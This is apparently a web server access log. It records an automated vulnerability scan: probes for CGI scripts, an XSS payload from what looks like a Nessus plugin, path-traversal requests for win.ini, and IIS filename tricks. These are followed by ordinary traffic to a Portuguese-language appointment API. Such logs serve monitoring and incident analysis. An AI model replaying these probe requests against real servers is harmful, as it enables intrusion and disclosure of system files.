[2026-06-22T17:03:22.118Z] GET /cgi-bin/wa
[2026-06-22T17:03:22.121Z] GET /cgi-bin/wa.cgi
[2026-06-22T17:03:22.124Z] GET /cgi-bin/wa.exe
[2026-06-22T17:03:22.126Z] GET /cgi-bin/whois.cgi
[2026-06-22T17:03:22.129Z] GET /cgi-bin-sdb/printenv
[2026-06-22T17:03:22.131Z] GET /cgi-mod/index.cgi
[2026-06-22T17:03:22.134Z] GET /cgi-sys/defaultwebpage.cgi
[2026-06-22T17:03:22.137Z] GET /cgi-sys/entropysearch.cgi
[2026-06-22T17:03:22.140Z] GET /index.cgi
[2026-06-22T17:03:22.142Z] GET /index.pl
[2026-06-22T17:03:22.145Z] GET /index.sh
[2026-06-22T17:03:22.147Z] GET /nph-mr.cgi
[2026-06-22T17:03:22.150Z] GET /query.cgi
[2026-06-22T17:03:22.153Z] GET /session_login.cgi
[2026-06-22T17:03:22.155Z] GET /show_bug.cgi
[2026-06-22T17:03:22.158Z] GET /test
[2026-06-22T17:03:22.160Z] GET /test.cgi
[2026-06-22T17:03:22.162Z] GET /ucsm/isSamInstalled.cgi
[2026-06-22T17:03:22.165Z] GET /whois.cgi
[2026-06-22T17:03:22.168Z] GET /wp-login.php
[2026-06-22T17:03:22.170Z] GET /wwwadmin.cgi
[2026-06-22T17:03:22.173Z] GET /wwwboard.cgi
[2026-06-22T17:03:22.175Z] GET /xampp/cgi.cgi
[2026-06-22T17:03:24.760Z] POST /cgi-bin/file_transfer.cgi
[2026-06-22T17:03:24.861Z] GET /logon?onok=%22%3e%3cscript%3ealert%28%27axon_logon_xss.nasl%27%29%3c%2fscript%3e
[2026-06-22T17:03:24.942Z] GET /error_page.htm
[2026-06-22T17:03:25.004Z] GET /default.asp%20
[2026-06-22T17:03:25.068Z] GET /default.asp::$DATA
[2026-06-22T17:03:25.115Z] GET /default.asp%2e
[2026-06-22T17:03:25.184Z] GET /
[2026-06-22T17:03:25.343Z] GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini
[2026-06-22T17:03:25.352Z] GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini
[2026-06-22T17:03:25.418Z] GET /..\pixfir~1\how_to_login.html
[2026-06-22T17:03:25.478Z] GET /SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator
[2026-06-22T17:03:25.503Z] GET /trace.axd
[2026-06-22T17:03:25.568Z] GET /global.asa
[2026-06-22T17:03:25.634Z] GET /index.jsp%00x
[2026-06-22T17:03:25.705Z] GET /user_settings.cfg
[2026-06-22T17:03:39.196Z] GET /
[2026-06-22T17:03:39.205Z] POST /
[2026-06-22T17:03:51.522Z] GET /rails_info/properties
[2026-06-22T17:03:51.616Z] GET /index.html
[2026-06-22T17:53:23.765Z] GET /api/paineladm
[2026-06-22T17:59:16.940Z] POST /api/login
[2026-06-22T17:59:20.486Z] GET /api/paineladm
[2026-06-22T17:59:20.819Z] GET /api/funcoes
[2026-06-22T17:59:20.829Z] GET /api/usuarios/listagemusuario
[2026-06-22T18:19:55.980Z] GET /api/consultastotas
[2026-06-22T18:19:55.984Z] GET /api/usuarioperfil
[2026-06-22T18:20:14.184Z] POST /api/login
[2026-06-22T18:20:17.650Z] GET /api/marcacaoultima?usuarioId=6a39264dc05e9fbd030b91b9
[2026-06-22T18:20:17.856Z] GET /api/especialidade/nomes
[2026-06-22T18:20:21.711Z] GET /api/marcacaofeitas?usuarioId=6a39264dc05e9fbd030b91b9
[2026-06-22T18:20:22.131Z] GET /api/especialidade/nomes
[2026-06-22T18:20:30.317Z] GET /api/marcacaoultima?usuarioId=6a39264dc05e9fbd030b91b9
[2026-06-22T18:20:30.519Z] GET /api/especialidade/nomes
[2026-06-22T18:20:33.061Z] GET /api/marcacaofeitas?usuarioId=6a39264dc05e9fbd030b91b9
[2026-06-22T18:20:33.521Z] GET /api/especialidade/nomes
[2026-06-22T18:20:36.610Z] GET /api/usuarioperfil
[2026-06-22T18:20:36.751Z] GET /api/consultastotas
[2026-06-22T18:20:55.714Z] POST /api/login
[2026-06-22T18:20:59.304Z] GET /api/paineladm
[2026-06-22T18:20:59.620Z] GET /api/funcoes
[2026-06-22T18:20:59.628Z] GET /api/usuarios/listagemusuario
[2026-06-22T18:21:30.925Z] GET /api/usuarioperfil
[2026-06-22T18:21:30.934Z] GET /api/consultastotas
